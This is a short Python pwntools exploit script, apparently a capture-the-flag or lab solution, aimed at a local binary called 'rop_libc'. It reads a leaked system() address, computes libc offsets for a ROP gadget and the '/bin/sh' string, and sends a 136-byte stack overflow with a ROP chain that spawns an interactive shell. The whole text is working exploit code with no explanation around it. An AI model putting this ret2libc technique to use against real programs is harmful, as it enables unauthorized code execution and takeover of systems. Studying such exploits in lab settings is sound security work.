from pwn import *

sh = process('./rop_libc')

libc = ELF('./libc.so')

vuln_addr = 0x000011db

system_addr_str = sh.recvuntil("\n")
system_addr = int(system_addr_str,16)
print "system_addr= " + hex(system_addr)

pop_pop_call_offset = 0x00000000000f982b - libc.symbols['system']
print "pop_offset= " + hex(pop_pop_call_offset)

bin_sh_offset = 0x0000000000181519 - libc.symbols['system'] # libc.search('/bin/sh').next()
print "bin_sh_offset= " + hex(bin_sh_offset)

pop_pop_call_addr = system_addr + pop_pop_call_offset
print "pop_addr= " + hex(pop_pop_call_addr)

bin_sh = system_addr + bin_sh_offset
print "bin_sh= " + hex(bin_sh)

payload = 'a'*136 +  p64(pop_pop_call_addr) + p64(system_addr) + p64(bin_sh)

sh.sendline(payload) 

sh.interactive()
